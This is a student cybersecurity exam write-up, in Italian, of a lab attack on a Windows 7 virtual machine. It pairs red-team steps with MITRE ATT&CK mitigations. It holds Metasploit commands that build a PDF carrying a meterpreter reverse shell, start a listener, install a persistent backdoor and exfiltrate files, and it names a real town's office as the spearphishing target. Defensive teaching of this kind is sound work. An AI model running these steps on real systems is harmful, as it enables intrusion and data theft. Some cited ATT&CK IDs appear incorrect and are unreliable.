# Windows7-ReverseShell-PDF

Hi, here's the complete documentation about my CyberSecurity University Exam, here we exploited a windows 7 Machine trough a reverse_shell script incapsulated in a malevolous pdf.
You can find the exploitable virtual machine of Windows 7 here: https://developer.microsoft.com/it-it/microsoft-edge/tools/vms/ , just select version and software.


Task performed by @v3l1d and @lorehaze:https://github.com/lorehaze

Complete PDF Content in Markdown:

## RELAZIONE CASO DI STUDI

# “ UNATTENDED ACCESS”

## SICUREZZA INFORMATICA

## DOCENTE: DANILO CAIVANO

## FLA TEAM: LORENZO BALDARI - ALESSANDRO DILEVRANO


- 1. Introduzione
   - 1.2 Contesto
   - 1.3 Scenario
- 2. Kill  chain
   - 2.1 Reconnaissance
   - 2.1.1 Red team
   - 2.1.2 Blue team
   - 2.2 Weaponization
   - 2.2.1 Red team
   - 2.2.2 Blue team
   - 2.3 Delivery
   - 2.3.1 Red team
   - 2.3.2 Blue team
   - 2.4 Exploit
   - 2.4.1 Red team
   - 2.4.2 Blue team
   - 2.5 Installation
   - 2.5.1 Red team
   - 2.5.2 Blue team
   - 2.6 Command and control
   - 2.6.1 Red team
   - 2.6.2 Blue team
   - 2.7 Action
   - 2.7.1 Red team
   - 2.7.2 Blue team
- 3. Conclusioni


## 1. Introduzione

_Fla Team_ è un gruppo di studenti del terzo anno, iscritti al C.d.L. in
Informatica e Comunicazione Digitale dell’Università degli Studi di Bari
Aldo Moro presso la sede di Taranto.

Il team è composto dagli studenti Lorenzo Baldari ed Alessandro
Dilevrano.

La docenza del corso appartiene al _prof. Danilo Caivano_ e, frequentando le
sue lezioni, il team ha potuto comprendere l’importanza dei tre concetti
fondamentali della _Sicurezza Informatica_ (Confidentially, Integrity,
Availability) e di quanto sia facile perderne il controllo.

_FLA Team_ ha lavorato al progetto denominato “ _Unattended Access_ ”, la cui
traduzione è “ _Accesso Inatteso_ ”: il nome vuole esprimere il pericolo celato
dietro la scarsa manutenzione dei sistemi tradizionalmente utilizzati nei
contesti aziendali quotidiani dove, per motivi legati ad una scarsa
portabilità di alcuni software proprietari o, in altri contesti, legati ad una
scarsa sensibilizzazione o conoscenza degli eventuali rischi, la sicurezza e
la manutenzione dei sistemi passa purtroppo in secondo piano.


### 1.2 Contesto

Durante il periodo corrente, le Pubbliche Amministrazioni italiane stanno
rendendo possibile la fruizione dei propri servizi attraverso la rete.

Come spesso purtroppo accade, non tutte le ramificazioni della P.A. sono
sempre o immediatamente dotate di sistemi aggiornati o manutenuti:
accade infatti frequentemente che, nonostante siano trattati dei dati
sensibili durante il normale svolgimento delle attività di competenza, i
sistemi risultino inadeguati a garantirne la sicurezza.

Recentemente, inoltre, Microsoft ha dismesso il sistema operativo
Windows 7 (principalmente utilizzato nel contesto business e, in
particolare, nelle P.A.) in favore del più recente Windows 10, arrestando
quindi la distribuzione dei relativi aggiornamenti di sicurezza.

Uno specifico esempio di P.A. è il comune di Manduria, il quale gestisce
quotidianamente un ingente numero di richieste provenienti anche dalle
frazioni del paese in oggetto.

Il team ha focalizzato l’attenzione sulla tipologia **Tr o j a n B a c k d o o r** , con
particolare preferenza della categoria volta ad ottenere una R **everse
Shell** , la quale permette di inviare ed eseguire comandi attraverso l’uso di
un account con privilegi di amministratore.

Una Backdoor ha il compito di superare le difese del sistema (come un
firewall n.d.r.) al fine di accedere remotamente ad un personal computer
e, previa esecuzione di comandi, permette di modificare il registro di
sistema della macchina vittima, di visualizzare il contenuto delle


directory, di eseguire comandi ed importare, di conseguenza, ulteriori
script malevoli, ecc.

Per aumentare l’efficacia di una Backdoor, è possibile nasconderla in
modo tale che nemmeno l’antivirus sia in grado di eliminarla,
permettendo all’attaccante di compromettere l’intero sistema.

### 1.3 Scenario

Lo scenario ipotizzato vede coinvolte due figure:

**Attaccante** : utilizza una macchina con sistema operativo
Kali Linux;

**Vittima** : utilizza una macchina con sistema operativo
Windows 7.

La **vittima** è un dipendente del comune di Manduria, operante in una
diramazione dello stesso, la quale è stata recentemente coinvolta nel
processo di digitalizzazione delle P.A.

In un contesto reale, le due macchine sono remote e connesse a reti
differenti, mentre nello specifico scenario proposto, data la natura
didattica del caso di studio, i due sistemi sono macchine virtuali connesse
alla stessa rete.

L’obiettivo dell’attacco è quello di ottenere il controllo della macchina
vittima al fine di esfiltrare eventuali dati sensibili.


Una volta ottenuto l’accesso alla macchina vittima, verrà installata una
Backdoor persistente, la quale permetterà di mantenerla attiva anche a
seguito di eventuali riavvii della macchina.

## 2. Kill  chain

#### RED TEAM VS BLUE TEAM

```
Ricognizione e studio del target,
individuazione di informazioni utili
sul terminale della vittima che si
vuole attaccare. (e-mail, sistema
operativo, architettura ecc..).
```
```
Reconnaissance
```
```
Bloccare tentativi di accesso
malevoli. Rimuovere o negare
l'accesso a software non necessario
e potenzialmente vulnerabile per
prevenire abusi.
In base alle informazioni acquisite,
si crea un payload che sfrutta le
vulnerabilità del sistema target.
Nello specifico il payload servirà
per realizzare il controllo remoto.
```
```
Weaponization
```
```
Monitorare il repository di codice
in cui è archiviato il payload.
Creare firme per rilevare il payload.
```
```
Il payload creato viene caricato in
rete oppure inviato alla vittima,
tramite e- mail o per mezzo di un
supporto rimovibile (USB).
```
```
Delivery
```
```
Adoperare ogni accorgimento che
evita di far raggiungere file
malevoli eseguibili sul terminale
utilizzando antivirus/antimalware e
utilizzando restrizioni sulle porte
USB.
Una volta inviato il file, avviamo
l’exploit che ci permetterà di
restare in ascolto sulla porta scelta
in precedenza, in attesa che la
vittima esegua il file malevolo.
```
```
Exploit
```
```
Utilizzare le firme di rilevamento
delle intrusioni per bloccare il
traffico ai confini della rete e
blocca l'esecuzione del codice su un
sistema tramite la whitelisting
dell'applicazione, la blacklist e / o il
blocco degli script.
```
```
Il file eseguito istallerà uno script
batch che a runtime lavorerà in
background. Acquisito il controllo
verrà istallata una backdoor
persistente.
```
```
Installation
```
```
Monitorare i carichi DLL per
processi, in particolare cercando
DLL non riconosciute o
normalmente non caricate in un
processo. Bloccare l’esecuzione del
codice sul sistema attraverso la
whitelisting delle applicazioni, la
blacklist e/o il blocco degli script.
```

### 2.1 Reconnaissance

La fase di **Reconnaissance** (ricognizione) è fondamentale per
determinare il successo o l’insuccesso dell’attacco.

### 2.1.1 Red team

Una tecnica utile a sottrarre informazioni è quella del **Gather Victim
Identity Information** ( **Mitre|Att&ck T1589** ), da questa deriva quella
dell’ **Email Addresses** ( **Mitre|Att&ck T1589.002** ).

La tecnica prevede prima della compromissione della vittima,
l’ottenimento degli indirizzi E-Mail che possono essere utilizzati durante
il targeting, i quali potrebbero essere presenti su Social Media o su siti
direttamente connessi alla vittima.

Nel nostro caso, la _P.A. del comune di Manduria_ , a seguito del suo processo
di digitalizzazione, ha fornito, tramite il suo sito web di riferimento, gli
indirizzi E-Mail dedicati ai quali è possibile inviare richieste e/o
documenti.

```
Comunicare su una porta
comunemente usata per bypassare i
firewall o i sistemi di rilevamento
della rete e fondersi con la normale
attività di rete per evitare ispezioni
dettagliate.
```
```
Command and control
```
```
Analizzare i dati di rete per flussi di
dati non comuni e analizzare il
contenuto del pacchetto per rilevare
le comunicazioni che non seguono
il comportamento del protocollo
previsto per la porta utilizzata.
L’attaccante ha il pieno controllo
della macchina remota vittima e
può quindi raggiungere l’obiettivo
esfiltrando i dati target. Una volta
sfruttata la vittima l’attaccante può
eliminare le sue tracce.
```
```
Action
```
```
Utilizzare le firme di rilevamento
delle intrusioni per bloccare il
traffico ai confini della rete.
Analizzare i dati di rete per flussi di
dati non comuni.
```

Un’altra tecnica utile a carpire informazioni è la **Discovery** ( **Mitre|
Att&ck TA0007** ): da questa è prelevabile quella del **Network Service
Scanning** ( **_Mitre|Att&ck T1046_** ), tramite la quale, mediante scansione di
porte e vulnerabilità, è possibile scoprire informazioni utili sul sistema.

L’attacco messo in scena dal team inizia con una fase di gathering degli
indirizzi E-Mail presenti sul sito della _P.A. del comune di Manduria_ e, dopo
aver collezionato il materiale utile, si passa alla successiva fase di Port
Scanning sulla rete locale creata, alla quale sono connesse la macchina
attaccante ( _Kali Linux_ ) e quella vittima ( _Windows 7_ ).

Utilizzando il tool **Zenmap** è stato possibile individuare ed isolare
dapprima l’indirizzo IP della macchina obiettivo tra tutte quelle connesse
alla stessa rete locale.


Successivamente, è stata avviata una scansione mirata sull’indirizzo IP
isolato al fine di acquisire ulteriori informazioni.

### 2.1.2 Blue team

Unica raccomandazione utile a mitigare il **Gather Victim Identity
Information** è quella di ridurre la quantità di informazioni sensibili
accessibili a terze parti.

Le mitigazioni proposte da **Mitre | Att&ck** per difendersi dal **Network
Service Scanning** sono:

**Network Intrusion Prevention** ( **Mitre | Att&ck M1031** ) secondo la
quale l’utilizzo di firme di rilevamento permette di intercettare e bloccare
il traffico ai confini della rete;

**Disable or Remove Feature or Program** ( **Mitre | Att&ck M1042** ) che,
mediante disabilitazione di funzionalità, programmi o servizi non
utilizzati, permette di ridurre la quantità di possibili punti di accesso;

**Network Segmentation (Mitre | Att&ck M1030)** che punta a
segmentare logicamente/fisicamente la rete al fine di rendere inaccessibili
alcune risorse dall’esterno.

### 2.2 Weaponization

Durante la fase di **Weaponization** si procede con la creazione del
malware.


### 2.2.1 Red team

Al fine di eseguire un’azione dannosa, l’attaccante si serve di un **payload** ,
il quale dev’essere congruente con gli scopi ed i target stabiliti.

La tecnica da utilizzare è la **Build Capabilities** ( **Mitre | Att&ck
TA0024** ) che offre, tra le varie tecniche, quella di **Obtain/Re-use
Payloads** ( **Mitre | Att&ck T1346** ).

Sulla macchina attaccante, dotata di sistema operativo Kali Linux, è stato
creato il primo payload calibrato per una macchina target con installato
Windows.

Nello specifico, è stato utilizzato il modulo Metasploit:

_exploit/windows/fileformat/adobe_pdf_embedded_exe_

Vengono quindi configurati i parametri dell’Exploit quali Filename,
Payload, Host in ascolto e relativa porta locale, tramite i seguenti
comandi:


_set FILENAME ModuloRossi_Firmato.pdf_

_set PAYLOAD windows/meterpreter/reverse_tcp_

_set LHOST 192.168.1._

_set LPORT 4444_

**N.B.** l’attributo INFILENAME contiene la posizione di un template
generico di file pdf costruito ad-hoc per versioni di Acrobat =< 9.

Ora, non resta che lanciare il comando “ _run_ ” per generare il file pdf
malevolo.

Prima di inviare il file alla vittima, mettiamo in ascolto l’handler sulla
macchina attaccante, a tal fine utilizziamo “ _exploit/multi/handler_ ” ed
impostiamone i parametri:

“set PAYLOAD windows/meterpreter/reverse_tcp”

“s _et LPORT 4444_ ”

“s _et LHOST 192.168.1.187_ ”


Lanciamo quindi l’ascolto con il comando “ _run”_.

### 2.2.2 Blue team

Non sono state individuate mitigazioni da **Mitre | Att&ck** alla tecnica
utilizzata dal red team. Unica raccomandazione è quella di monitorare il
repository di codice in cui sono archiviati i payload per scoprire quelli più
utilizzati e, quindi, creare firme per rilevarlo.

### 2.3 Delivery

La fase di **Delivery** consiste nell’individuare il modo più efficace per
inviare alla vittima il file creato durante la fase di **Weaponization**.


### 2.3.1 Red team

Il Payload creato può essere inviato alla vittima in diversi modi. Il team ha
individuato quattro tecniche utilizzate nel contesto reale.

**- Initial Access** _(_ **Mitre | Att&ck TA0001** _)_ : consiste nel tentare l’accesso ad
    una rete e successivamente mantenerlo sfruttando un servizio o un
    cambio di credenziali.
**- Masquerade as Legitimate Application (Mitre | Att&ck TA1444):**
    consiste nel mascherare il malware come un’applicazione nota o un
    file riconosciuto.
**- Spearphishing Attachment** **_(_** **Mitre | Att&ck T1566.001** **_)_** : consiste
    nell’inviare alla vittima il payload tramite e-mail. L’utente solitamente
    viene indotto, in qualche modo, ad eseguire il file.

Nel nostro scenario, durante la prima fase dell’attacco sono stati rilevati
gli indirizzi mail utili ad inviare della documentazione da far pervenire
agli uffici del Comune.

Sarà quindi utilizzato l’invio di una mail all’indirizzo recuperato durante
la prima fase allegando un link tramite il quale sarà effettuato il download
automatico del file pdf malevolo.


Data la natura didattica del progetto, è stato sfruttato il server Apache2 di
Kali Linux per trasferire il file attraverso le due macchine virtuali.

### 2.3.2 Blue team

La mitigazione proposta da **Mitre | Att&ck** a questo tipo di attacco è
quella dell’ **User Training** ( **Mitre | Att&ck M1017** ) che prevede di
formare gli utenti e fornire loro delle guide per effettuare particolari
impostazioni di configurazione del sistema o per evitare comportamenti
potenzialmente rischiosi.

Per difendersi dallo **Spearphishing Attachment** può essere utilizzata la
mitigation **Antivirus/Antimalware** _(_ **Mitre | Att&ck M1049** _)_ che usa le
firme o l'euristica per rilevare software dannosi, rimuoverli o metterli in
quarantena.


### 2.4 Exploit

Durante questa fase, l’attaccante utilizza un software per inviare comandi
e compiere azioni malevole.

### 2.4.1 Red team

In questa fase è stato indispensabile affidarci all’esecuzione dell’utente,
ovvero **User Execution** _(_ **Mitre | Att&ck T1204** _)_ che è così descritta:
_“Per l’exploit un avversario può fare affidamento su azioni specifiche di un utente per
ottenere l'esecuzione. Potrebbe trattarsi dell'esecuzione diretta del codice, ad esempio
quando un utente apre un eseguibile dannoso consegnato tramite Spearphishing
Attachment con l'icona e l'estensione apparente di un file sicuro.”_

Durante la fase di **Weaponization** , la macchina attaccante è stata messa
in ascolto utilizzando un handler, nel momento in cui la vittima aprirà il
file pdf allegato alla mail, verrà instaurata una comunicazione remota tra
la macchina attaccante e quella vittima.


### 2.4.2 Blue team

Una mitigazione proposta per proteggere il sistema da eventuali exploit
prende il nome di **Execution Prevention** ( **Mitre | Att&ck M1038** ) che
consiste nell’utilizzo di funzionalità di rilevazione e blocco delle
condizioni che possono portare (o essere indicative) di un exploit
software.

Viene proposta inoltre la **User Training (Mitre | Att&ck M1017)**
precedentemente descritta.

Un’altra mitigazione è quella del **Network Intrusion Prevention** ( **Mitre
| Att&ck M1031** ) che consiste nell’utilizzo di un sistema di rilevamento
intrusioni per rimuovere eventuali file malevoli e bloccarne l’utilizzo o
impedirne il funzionamento.

### 2.5 Installation

Dopo aver compromesso il sistema, l’attaccante installa la backdoor sulla
macchina vittima.

### 2.5.1 Red team

Una volta ottenuto il controllo della macchina vittima, vengono utilizzate
le tecniche **DLL AppCert** ( **Mitre | Att&ck T1182** ) e **Persistence** ( **Mitre
| Att&ck TA0003** ), utile a ristabilire il controllo anche a seguito di un
riavvio o un arresto della macchina vittima.

Tramite il comando “ _persistence_ ” di **Meterpreter** verrà installata nella
macchina vittima uno script che renderà la backdoor persistente.


Visualizziamo un elenco di funzionalità offerte da **Meterpreter** per
_persistence_ :

Creiamo quindi la backdoor tramite il comando:

“r _un persistence -A -U -i 10 -p 4444 -r 192.168.1.187”_

Abbiamo, quindi, creato una backdoor persistente che ci permetterà di
mantenere il comando e il controllo della macchina vittima anche in
seguito a riavvi, perdite di connessione o qualsiasi altro inconveniente.


### 2.5.2 Blue team

La raccomandazione che **Mitre | Att&ck** propone è quella di monitorare i
carichi DLL per processi, in particolare cercando DLL non riconosciute o
normalmente non caricate in un processo. Una tecnica utilizzabile è
quella dell’ **Execution Prevention** ( **Mitre | Att&ck M1038** ) che blocca
l’esecuzione del codice su un sistema attraverso la whitelisting delle
applicazioni, la blacklist e/o il blocco degli script.

### 2.6 Command and control

In questa fase l’attaccante assume il controllo da remoto del sistema
compromesso.

### 2.6.1 Red team

A questo punto, il sistema Windows è sotto il controllo della macchina
Kali Linux. La tecnica da utilizzare fa parte della tattica **Command and
Control** ( **Mitre | Att&ck TA0011** ), in particolare della **Non-Standard
Port (Mitre | Att&ck T1571)** che prevede l’utilizzo di porte tipicamente
non associate ai servizi conosciuti di riferimento al fine di bypassare i
firewall o i sistemi di rilevamento della rete, fondendosi con la normale
attività.

Per testare di essere in pieno possesso della macchina vittima, digitando il
comando “ _shell”_ e successivamente il comando “ _systeminfo”_ , visualizziamo
quanto segue:


### 2.6.2 Blue team

Per difendersi è possibile utilizzare la tecnica del **Network Intrusion
Prevention** ( **Mitre | Att&ck M1031** ) che prevede l’utilizzo di controlli
per analizzare il traffico della rete al fine di individuare anomalie o
probabili intrusioni.

Inoltre, è possibile mitigare l’attacco con **Network Segmentation** ( **Mitre
| Att&ck M1030** ), ovvero progettare sezioni della rete per isolare
sistemi, funzioni o risorse critiche. Utilizzare la segmentazione fisica e
logica per impedire l'accesso a sistemi e informazioni potenzialmente
sensibili.

### 2.7 Action

Compromettendo la macchina remota, è possibile esfiltrare qualsiasi dato,
compromettere qualsiasi file, sniffare password, eseguire ulteriore codice
malevolo, ecc.


### 2.7.1 Red team

Nello scenario immaginato, ricordiamo, l’obiettivo è quello di esfiltrare
dati dalla macchina vittima. Per effettuare l’ _esfiltrazione_ sono state
utilizzate le tecniche:

**Exfiltration** ( **Mitre | Att&ck TA0010** ): insieme di tecniche che
permettono l’esfiltrazione di dati e la compressione degli stessi al fine di
eludere eventuali firme sul contenuto.

**Exfiltration Over Command and Control Channel** ( **Mitre | Att&ck
T1041** ) che prevede la sottrazione di materiale sensibile mediante l’uso
di un canale aperto;

A scopo dimostrativo è stata scaricata sulla macchina attaccante Kali
Linux una cartella denominata “Documents” contenente dati sensibili
della P.A. del Comune di Manduria come di seguito mostrato.

Ad attacco ultimato, procediamo con la rimozione delle nostre tracce dalla
macchina vittima attraverso l’utilizzo del comando “ _resource”_.


### 2.7.2 Blue team

Individuato il malware dannoso, si procede alla sua eliminazione. A
questo punto, l’utente sostituisce le credenziali compromesse. Una
maggiore sicurezza delle proprie informazioni è realizzabile tramite dei
metodi di crittografia utilizzando la tecnica di **Encrypt Sensitive
Information** ( **Mitre | Att&ck M1041** ). Inoltre, è buona norma eseguire
abitualmente un **Data Backup** ( **Mitre | Att&ck M1053** ) per attenuare i
danni che un attacco informatico può provocare.

## 3. Conclusioni

Per concludere, ci teniamo a sottolineare l’importanza di utilizzare dei
sistemi sempre aggiornati e ben manutenuti.

Il tutto, deve essere necessariamente accompagnato da una buona
conoscenza e sensibilizzazione al rischio informatico dei dipendenti/
utenti finali.

Per citare una famosa frase di _William Malik:_

_“A business will have good security if its corporate culture is correct. That depends on
one thing: tone at the top. There will be no grassroots effort to overwhelm corporate
neglect”_

```
Grazie per l’attenzione dedicataci.
```
```
Fla team.
```

